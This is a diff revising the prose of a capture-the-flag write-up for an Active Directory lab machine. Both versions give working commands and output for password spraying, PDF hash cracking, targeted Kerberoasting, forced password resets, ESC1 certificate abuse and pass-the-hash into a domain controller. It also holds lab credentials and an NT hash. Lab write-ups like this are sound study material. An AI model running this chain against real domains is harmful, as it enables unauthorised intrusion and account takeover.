@@ -35,7 +35,7 @@ e.hills:Il0vemyj0b2025!
 
 ## RustScan
 
-We use RustScan for initial port discovery. RustScan finds the open ports quickly and hands them off to Nmap for service detection and script scanning.
+We start with RustScan to find the open ports quickly. It hands them straight to Nmap, which identifies the services and pulls their details.
 
 ```
 rustscan -a 10.1.92.228 -- -sC -sV
@@ -157,7 +157,7 @@ SMB         10.1.92.228      445    DC01             SYSVOL          READ       
 
 *Validating e.hills credentials with NetExec and enumerating available shares*
 
-There is READ access to a `Human Resources` share, which is non-standard and worth investigating. Let's take a look at what it contains.
+There is READ access to a `Human Resources` share, which is non-standard and worth a look.
 
 ## Smbclient
 
@@ -195,7 +195,7 @@ getting file \Welcome Start Guide.pdf of size 89511 as Welcome Start Guide.pdf (
 
 *Smbclient connected to the Human Resources share with five PDFs downloaded*
 
-Five PDF documents that look like onboarding and HR material. We download them all with `mget *` and start reviewing. The `Welcome Start Guide.pdf` stands out as the most likely to contain useful information for a new employee, but when we try to open it, the PDF is password-protected.
+Five onboarding and HR documents. `Welcome Start Guide.pdf` is the one most likely to hold something useful for a new employee, and it turns out to be password-protected.
 
 ![PDF password protected](images/pdf-protected.png)
 
@@ -211,17 +211,15 @@ pdf2john Welcome\ Start\ Guide.pdf > pdf_hash.txt
 john pdf_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-The PDF password cracks to `humanresources`. Opening the document with this password reveals a default account password: `Welcome2025!@`.
+The PDF password cracks to `humanresources`. Opening the document reveals a default account password: `Welcome2025!@`.
 
 ![Default password in PDF](images/pdf-default-password.png)
 
 *Welcome Start Guide containing the default account password Welcome2025!@*
 
-We now have a default password that may still be in use across the domain.
+## Access as a.harris
 
-## Password Spraying
-
-We enumerate all domain users with NetExec so we have a list of targets for the spray.
+A default password documented for new starters is worth spraying, so we pull the domain user list first.
 
 ```
 nxc smb WELCOME.local -u 'e.hills' -p 'Il0vemyj0b2025!' --users
@@ -245,7 +243,7 @@ SMB         10.1.92.228      445    DC01             svc_web                    
 SMB         10.1.92.228      445    DC01             [*] Enumerated 11 local users: WELCOME
 ```
 
-Eleven domain users. We notice `i.park` is tagged as an "IT Intern" and there are two service accounts: `svc_ca` and `svc_web`. We save the usernames to a `users.txt` file and spray the default password against all of them.
+Eleven domain users, including an "IT Intern" tagged `i.park` and two service accounts, `svc_ca` and `svc_web`. We save the usernames to a `users.txt` file and spray the default password against all of them.
 
 ```
 nxc smb WELCOME.local -u users.txt -p 'Welcome2025!@' --continue-on-success
@@ -270,11 +268,11 @@ SMB         10.1.92.228      445    DC01             [-] WELCOME.local\svc_web:W
 
 *Password spray with default password: a.harris is a hit*
 
-One hit: `a.harris` is still using the default password. We now have two valid accounts in the domain.
+One hit. `a.harris` is still using the default password, which gives us two valid accounts in the domain.
 
 ## BloodHound Enumeration
 
-With two sets of credentials, we collect BloodHound data using NetExec to map out the domain's ACL relationships and group memberships. We point NetExec at the DC for DNS with `--dns-server` so the collector can resolve the domain records it asks for.
+We point NetExec at the DC for DNS with `--dns-server` so the collector can resolve the domain records it asks for.
 
 ```
 nxc ldap 10.1.92.228 -u 'a.harris' -p 'Welcome2025!@' --bloodhound --collection All --dns-server 10.1.92.228
@@ -288,19 +286,15 @@ LDAP        10.1.92.228      389    DC01             Done in 0M 16S
 LDAP        10.1.92.228      389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.92.228_2026-06-29_173327_bloodhound.zip
 ```
 
-Once the data is collected, we import it into BloodHound.
-
-We mark `e.hills` and `a.harris` as owned and start exploring their relationships. The key finding is that `a.harris` is a member of `HR@WELCOME.LOCAL`, which has `GenericAll` over `i.park`. We also see `a.harris` is in the `Remote Management Users` group, indicating WinRM access to the DC.
+We import the data and mark `e.hills` and `a.harris` as owned. `a.harris` is a member of `HR@WELCOME.LOCAL`, and that group holds `GenericAll` over `i.park`, so the permission reaches us through the group rather than sitting on the account. `a.harris` is also in `Remote Management Users`.
 
 ![BloodHound GenericAll](images/bloodhound-genericall.png)
 
 *BloodHound GenericAll: HR over i.park*
 
-Let's confirm that WinRM access first.
-
 ## Shell as a.harris (user.txt)
 
-Since `a.harris` is in `Remote Management Users`, we connect with Evil-WinRM.
+`Remote Management Users` means WinRM, so we connect with Evil-WinRM.
 
 ```
 evil-winrm -i '10.1.92.228' -u 'a.harris' -p 'Welcome2025!@'
@@ -310,11 +304,11 @@ evil-winrm -i '10.1.92.228' -u 'a.harris' -p 'Welcome2025!@'
 
 *Evil-WinRM session as a.harris on DC01*
 
-We have a shell on the DC and can grab `user.txt` from the desktop of `a.harris`. Now let's move back to BloodHound and work the `GenericAll` relationship.
+We have a shell on the DC and grab `user.txt` from the desktop of `a.harris`.
 
-## Targeted Kerberoast
+## Access as i.park
 
-The `HR` group holds `GenericAll` over `i.park`, and `a.harris` inherits it through that membership, which gives us full control of the account. BloodHound suggests two abuse paths: a Targeted Kerberoast and a Force Password Change. We try the Targeted Kerberoast first using targetedKerberoast.py, which sets an SPN on the target account, requests the TGS, and cleans up the SPN after.
+BloodHound suggests two abuse paths off the `GenericAll` edge. We try the Targeted Kerberoast first. Setting a Service Principal Name on an account makes it roastable: any authenticated user can then request a service ticket for it, and part of that ticket is encrypted with a key derived from the account's password, so we crack it offline. targetedKerberoast.py sets the SPN, requests the TGS, and cleans it up after.
 
 ```
 ./targetedKerberoast.py -d WELCOME.local --dc-ip 10.1.92.228 -u 'a.harris' -p 'Welcome2025!@'
@@ -346,11 +340,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Session completed. 
 ```
 
-Zero results. The password is not in `rockyou.txt`. Time to pivot to the second abuse path.
-
-## Access as i.park
-
-Since the Targeted Kerberoast does not produce a crackable hash, we fall back to a Force Password Change. `GenericAll` lets us reset `i.park`'s password outright without knowing the current one. We use `net rpc` to set a new password.
+Zero results. The password is not in `rockyou.txt`, so we fall back to the second path. `GenericAll` also allows a password reset without knowing the current one, and we use `net rpc` to set a new one.
 
 ```
 net rpc password "i.park" "0xB1rdWasHere1337" -U "WELCOME.local"/"a.harris"%"Welcome2025\!@" -S "10.1.92.228"
@@ -384,8 +374,6 @@ SMB         10.1.92.228      445    DC01             SYSVOL          READ       
 
 *Validating i.park credentials with NetExec*
 
-We are now operating as `i.park`. Let's head back to BloodHound to see what this account opens up.
-
 ## BloodHound Enumeration (Part 2)
 
 We mark `i.park` as owned and check outbound relationships. `i.park` has `ForceChangePassword` over both `svc_ca` and `svc_web`.
@@ -394,7 +382,7 @@ We mark `i.park` as owned and check outbound relationships. `i.park` has `ForceC
 
 *BloodHound ForceChangePassword: i.park over svc_ca and svc_web*
 
-Of the two targets, `svc_ca` is the priority. The name and its membership in `Certificate Service DCOM Access` both point at AD CS. That group only grants DCOM access to the certificate authority and a default install puts Authenticated Users in it, so it is a signpost rather than a privilege.
+Of the two targets, `svc_ca` is the priority. The name and its membership in `Certificate Service DCOM Access` both point at AD CS. That group only grants DCOM access to the CA and a default install puts Authenticated Users in it, so it is not a privilege. What it tells us is that AD CS is deployed here.
 
 ![Certificate Service DCOM Access group](images/bloodhound-cert-dcom.png)
 
@@ -402,7 +390,7 @@ Of the two targets, `svc_ca` is the priority. The name and its membership in `Ce
 
 ## Access as svc_ca
 
-Using the same Force Password Change technique, we authenticate as `i.park` to reset `svc_ca`'s password.
+We reset `svc_ca`'s password the same way, authenticating as `i.park`.
 
 ```
 net rpc password "svc_ca" "0xB1rdWasHere1337" -U "WELCOME.local"/"i.park"%"0xB1rdWasHere1337" -S "10.1.92.228"
@@ -435,8 +423,6 @@ SMB         10.1.92.228      445    DC01             SYSVOL          READ       
 ![Access validated as svc_ca](images/access-svcca.png)
 
 *Validating svc_ca credentials with NetExec*
-
-We now control the `svc_ca` account. Let's enumerate the AD CS environment.
 
 ## Certipy Enumeration
 
@@ -521,15 +507,13 @@ Certificate Templates
 
 *Certipy identifying ESC1 on the Welcome-Template with svc_ca enrollment rights*
 
-Certipy flags an ESC1 vulnerability on the `Welcome-Template`. The CA name is `WELCOME-CA` and the template is enabled with `svc_ca` holding enrollment rights.
+Certipy flags ESC1 on the `Welcome-Template`. The CA is `WELCOME-CA`, the template is enabled, and `svc_ca` holds enrollment rights on it.
 
-## ESC1
+## Access as Administrator
 
-ESC1 is a certificate template misconfiguration where the template allows the requester to specify an arbitrary identity in the Subject Alternative Name (SAN) and includes a client authentication EKU. When a user with enrollment rights requests a certificate from this template, they can specify any UPN in the SAN, including a domain admin. The CA issues the certificate without manager approval, and the attacker authenticates to the domain as the impersonated user via PKINIT. PKINIT is the Kerberos extension that lets a certificate stand in for a password when requesting a ticket.
+ESC1 is a template misconfiguration where the requester can specify an arbitrary identity in the Subject Alternative Name and the template includes a client authentication EKU. A user with enrollment rights can request a certificate naming any UPN, including a domain admin, and the CA issues it without manager approval. We then authenticate as that user via PKINIT, the Kerberos extension that lets a certificate stand in for a password.
 
-The `Welcome-Template` has `Enrollee Supplies Subject` set to `True`, `Client Authentication` enabled, no manager approval, and zero authorized signatures required. `svc_ca` has enrollment rights. This is a textbook ESC1.
-
-We request a certificate as `Administrator`, specifying the Administrator UPN and SID in the request. The SID comes off the Administrator object in BloodHound under the Object Information tab. Certipy's `-sid` flag puts the target SID in the Subject Alternative Name so a current DC maps the certificate to the right account.
+We request a certificate as `Administrator`, taking the SID off the Administrator object in BloodHound under the Object Information tab. `-sid` puts the target SID in the Subject Alternative Name so a current DC maps the certificate to the right account.
 
 ```
 certipy-ad req -u 'svc_ca@WELCOME.local' -p '0xB1rdWasHere1337' -dc-ip '10.1.92.228' -target 'DC01.WELCOME.LOCAL' -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'administrator@WELCOME.local' -sid 'S-1-5-21-141921413-1529318470-1830575104-500'
@@ -539,11 +523,7 @@ certipy-ad req -u 'svc_ca@WELCOME.local' -p '0xB1rdWasHere1337' -dc-ip '10.1.92.
 
 *Certipy requesting a certificate as Administrator via ESC1*
 
-The certificate is issued and saved as `administrator.pfx`.
-
-## Certipy Auth
-
-With the PFX in hand, we authenticate to the domain using Certipy. Successful authentication results in a Kerberos TGT for the `Administrator` account and recovers the NT hash. Certipy gets that hash by requesting a Kerberos ticket to itself and reading the credential blob the KDC packs into the ticket's PAC.
+The certificate is issued and saved as `administrator.pfx`. We authenticate with it to recover the NT hash.
 
 ```
 certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.1.92.228'
@@ -568,11 +548,11 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 *Certipy PKINIT authentication: TGT and NT hash recovered for Administrator*
 
-Certipy retrieves the NT hash `0cf1b799460a39c852068b7c0574677a` for the Administrator account. We now have everything we need to log in.
+Certipy gets that hash by requesting a Kerberos ticket to itself and reading the credential blob out of the ticket's PAC. We have `0cf1b799460a39c852068b7c0574677a`.
 
 ## Shell as Administrator (root.txt)
 
-Both RDP and WinRM are available on the DC. We connect with Evil-WinRM using the recovered hash. NTLM authenticates with the hash itself rather than the plaintext, so there is nothing left to crack.
+Both RDP and WinRM are available on the DC. We connect with Evil-WinRM using the hash, since NTLM authenticates with the hash itself and there is nothing left to crack.
 
 ```
 evil-winrm -i '10.1.92.228' -u 'Administrator' -H '0cf1b799460a39c852068b7c0574677a'
@@ -590,8 +570,8 @@ We grab `root.txt` from the Administrator's desktop and the domain is fully comp
 
 ## Final Thoughts
 
-Welcome puts a password-protected HR document at the front of the chain and a certificate template at the end of it, and everything in between is a permission somebody delegated and never revisited. The part I got the most out of was the middle. The Targeted Kerberoast against `i.park` handed me a hash `rockyou.txt` could not touch, and the same `GenericAll` edge that made the roast possible also allowed a Force Password Change, so the dead end cost nothing.
+The dead end was the useful part of this one. I burned a Targeted Kerberoast on `i.park` and got a hash `rockyou.txt` could not touch, then realised the same edge that let me set the SPN also let me reset the password outright. Reading the edge properly first would have saved the step.
 
-The key takeaways are keeping default passwords out of shared documents, auditing `ForceChangePassword` and `GenericAll` permissions in Active Directory, and reviewing certificate templates for `Enrollee Supplies Subject`. ESC1 is one of the most commonly exploited AD CS misconfigurations, and any template where the requester controls the SAN should be locked down or removed unless there is a clear operational need. That HR share sat on the domain controller itself, handing onboarding documents to any user who asked, and the default password inside one of them is the cheapest thing on this list to get right.
+An HR share on the domain controller handing onboarding documents to any domain user is the cheapest finding here to fix, and the default password inside one of them is why it mattered. `GenericAll` and `ForceChangePassword` need auditing on a schedule, since both of those hops were delegated permissions nobody revisited. On the CA, any template with `Enrollee Supplies Subject` enabled lets one account's enrollment rights become a certificate for any account in the domain, and that one should be locked down or removed unless there is a clear operational need for it.
 
 — 0xB1rd
